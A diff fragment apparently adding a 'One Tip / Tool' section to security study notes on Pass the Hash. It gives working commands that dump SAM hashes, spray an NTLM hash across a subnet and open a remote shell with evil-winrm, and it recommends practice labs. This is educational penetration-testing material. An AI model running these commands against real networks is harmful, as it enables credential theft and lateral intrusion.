@@ -44,3 +44,20 @@ From a defender's side, Microsoft introduced Protected Users security group and 
 - Lateral Movement: using access on one compromised machine to move to other machines on the same network
 - Mimikatz: a tool that extracts plaintext passwords, hashes, and Kerberos tickets from Windows memory
 - LAPS (Local Administrator Password Solution): Microsoft tool that assigns unique randomized passwords to local admin accounts on each machine
+
+## One Tip / Tool
+
+Tool: `mimikatz` for hash dumping and `crackmapexec` for using hashes across the network
+
+```bash
+# dump all hashes from the SAM database (offline - from a mounted drive)
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# spray a hash across an entire subnet to find where it works
+crackmapexec smb 192.168.1.0/24 -u Administrator -H [NTLM hash] --local-auth
+
+# get an interactive shell using a hash
+evil-winrm -i 192.168.1.10 -u Administrator -H [NTLM hash]
+```
+
+A good way to practice Pass the Hash safely is on **HackTheBox** or **TryHackMe** Windows machines — almost every Windows box involves some form of hash dumping and lateral movement. The room "Active" on HackTheBox is a classic example that walks through the exact PtH workflow in an Active Directory environment.
